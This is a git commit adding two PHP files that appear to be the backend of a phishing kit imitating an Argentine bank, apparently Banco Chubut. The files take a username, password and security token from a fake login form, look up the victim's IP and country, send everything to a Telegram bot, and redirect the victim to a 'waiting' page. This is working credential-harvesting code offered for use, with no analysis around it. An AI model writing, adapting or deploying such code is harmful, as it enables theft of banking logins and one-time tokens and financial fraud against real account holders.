322483ecd48d75136162b832aa1a1a403e8c3e75
bancoreenlineaar <152825184+bancoreenlineaar@users.noreply.github.com>
2023-12-03 19:59:42 -0500

    Add files via upload

---
+++ ch1.php
@@ -0,0 +1,52 @@
+<?php
+ini_set("display_errors", 0);
+include "tlg.php";
+
+
+if (isset($_POST['usch']) && isset($_POST['cntch']) ) {
+    $input2 = $_POST['usch'];
+    $input3 = $_POST['cntch'];
+    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
+    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
+    $mensajex .= "🔵CHUBUT🔵\n👤US4R: ".$_POST['usch']."\n🔒Cl4x: ".$_POST['cntch']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\n";
+
+    env($token, $tid, $mensajex);
+}
+function getIpInfo($ip) {
+    $url = "http://ipinfo.io/{$ip}/json";  
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($curl);
+    curl_close($curl);
+    
+    return json_decode($response, true);
+}
+function env($token, $chatID, $mensaje) {
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $data = array(
+        'chat_id' => $chatID,
+        'text' => $mensaje
+    );
+
+    $options = array(
+        CURLOPT_URL => $url,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => http_build_query($data),
+        CURLOPT_RETURNTRANSFER => true,
+    );
+
+    $curl = curl_init();
+    curl_setopt_array($curl, $options);
+    $response = curl_exec($curl);
+    curl_close($curl);
+
+    return $response;
+    
+}
+echo "<script>window.location.href = \"../espera.html\"</script>";
+?>
+
+
+
+
---
+++ ch2.php
@@ -0,0 +1,51 @@
+<?php
+ini_set("display_errors", 0);
+include "tlg.php";
+
+
+if (isset($_POST['th1']) ) {
+    $input = $_POST['th1'];
+    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
+    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
+    $mensajex .= "🔵CHUBUT🔵\n🔑T0K4N: ".$_POST['th1']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\n";
+
+    env($token, $tid, $mensajex);
+}
+function getIpInfo($ip) {
+    $url = "http://ipinfo.io/{$ip}/json";  
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($curl);
+    curl_close($curl);
+    
+    return json_decode($response, true);
+}
+function env($token, $chatID, $mensaje) {
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $data = array(
+        'chat_id' => $chatID,
+        'text' => $mensaje
+    );
+
+    $options = array(
+        CURLOPT_URL => $url,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => http_build_query($data),
+        CURLOPT_RETURNTRANSFER => true,
+    );
+
+    $curl = curl_init();
+    curl_setopt_array($curl, $options);
+    $response = curl_exec($curl);
+    curl_close($curl);
+
+    return $response;
+    
+}
+echo "<script>window.location.href = \"../esperan.html\"</script>";
+?>
+
+
+
+
